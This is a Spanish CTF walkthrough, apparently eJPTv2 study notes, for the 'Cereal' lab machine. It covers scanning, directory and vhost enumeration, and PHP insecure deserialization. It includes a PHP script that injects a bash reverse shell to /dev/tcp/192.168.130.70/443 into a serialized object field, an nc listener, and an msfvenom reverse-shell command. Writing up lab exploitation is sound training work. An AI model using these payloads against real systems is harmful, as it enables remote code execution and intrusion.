


## 🕸️ #WEB — SERIALIZACIÓN DE DATOS Y DESERIALIZACIÓN INSEGURA (eJPTv2)

---

### 🔧 ¿Qué es la serialización?

> **Serialización**: Mecanismo que convierte un objeto (clase con atributos y métodos) en una cadena de texto para almacenarlo o enviarlo por red.  
> **Deserialización**: Proceso inverso. Si no se valida adecuadamente, puede ser explotada para ejecutar código malicioso.

---

### 📡 1. Escaneo inicial de red interna

Descubrimos hosts activos en la red local con ARP:

bash

CopiarEditar

`sudo arp-scan -I ens33 --localnet --ignoredups`

---

### 🔍 2. Escaneo de puertos

Extraemos todos los puertos abiertos:

bash

CopiarEditar

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.49 -oG allPorts`

Luego, escaneamos versiones y servicios específicos (puertos detectados):

bash

CopiarEditar

`nmap -sC -sV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 192.168.0.49 -oN targeted`

---

### 🌐 3. Descubrimiento de rutas en HTTP

bash

CopiarEditar

`gobuster dir -u http://192.168.0.49/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

---

### 🧭 4. Resolución DNS personalizada

Agregamos la IP a `/etc/hosts`:

CopiarEditar

`192.168.0.49 cereal.ctf`

Si Firefox redirige a Google cuando escribimos `cereal.ctf`, abrimos `about:config` y agregamos:

arduino

CopiarEditar

`browser.fixup.domainsuffixwhitelist.ctf → true`

(Para otros dominios como `.pepito`, simplemente cambia `.ctf` por `.pepito`.)

---

### 🌐 5. Descubrimiento de subdominios

bash

CopiarEditar

`gobuster vhost -u http://cereal.ctf:44441/ -w /usr/share/seclists/Discovery/DNS/subdomains-top-1million-5000.txt -t 20 --append-domain`

> ⚠️ Usamos `--append-domain` porque Gobuster no resuelve bien los subdominios en ese entorno sin él.

Agregamos el subdominio encontrado:

CopiarEditar

`192.168.0.49 secure.cereal.ctf`

---

### 📡 6. Identificamos funcionalidad vulnerable

Abrimos `http://secure.cereal.ctf:44441/`, vemos que realiza pings.  
Nos ponemos en escucha para analizar el tráfico ICMP:

bash

CopiarEditar

`tcpdump -i ens33 icmp -n`

---

### 🛠️ 7. Interceptamos con Burp Suite

Petición interceptada:

makefile

CopiarEditar

`POST / HTTP/1.1 Host: secure.cereal.ctf:44441 ... obj=O:8:"pingTest":1:{s:9:"ipAddress";s:14:"192.168.130.70";}&ip=192.168.130.70`

Aquí vemos el objeto PHP serializado: el servidor lo deserializa y probablemente lo usa sin sanitizar. ⚠️ Vulnerabilidad clara de deserialización PHP.

---

### 💣 8. Explotación de deserialización PHP

Creamos un script en PHP:

php

CopiarEditar

`<?php class pingTest {     public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.130.70/443 0>&1'";     public $isValid = true;     public $output = "";      function __destruct() {         system("ping " . $this->ipAddress);     } }  echo urlencode(serialize(new pingTest()));`

Ejecutamos:

bash

CopiarEditar

`php serialize.php 2>/dev/null; echo`

Copiamos el output y lo pegamos en Burp como nuevo valor del campo `obj`.

Nos ponemos en escucha:

bash

CopiarEditar

`nc -nlvp 443`

---

### 🪜 9. Enumeración avanzada de rutas

Escaneamos el subdominio:

bash

CopiarEditar

`gobuster dir -u http://secure.cereal.ctf:44441/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

Encontramos:

bash

CopiarEditar

`http://secure.cereal.ctf:44441/back_en/`

Devuelve `403 Forbidden` ➜ posible acceso indirecto.

Fuerza bruta dentro de esa ruta:

bash

CopiarEditar

`gobuster dir -u http://secure.cereal.ctf:44441/back_en -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,bak`

🔍 Encontramos: `/index.php.bak`

Este archivo contiene el código fuente original. Lo descargamos y analizamos. Ahí confirmamos si se hace `unserialize($_POST['obj'])` y cómo se usa la clase.

---

### 🧠 Notas adicionales

- Los ataques de deserialización no solo aplican a PHP, también a lenguajes como Python (`pickle`), Java (`readObject()`), Node.js, etc.
    
- Se pueden usar payloads avanzados con herramientas como:
    
    - [`phpggc`](https://github.com/ambionics/phpggc)
        
    - [`ysoserial` (Java)]
        
- Las reverse shells pueden generarse con:
    
    bash
    
    CopiarEditar
    
    `msfvenom -p php/reverse_php LHOST=192.168.130.70 LPORT=443 -f raw`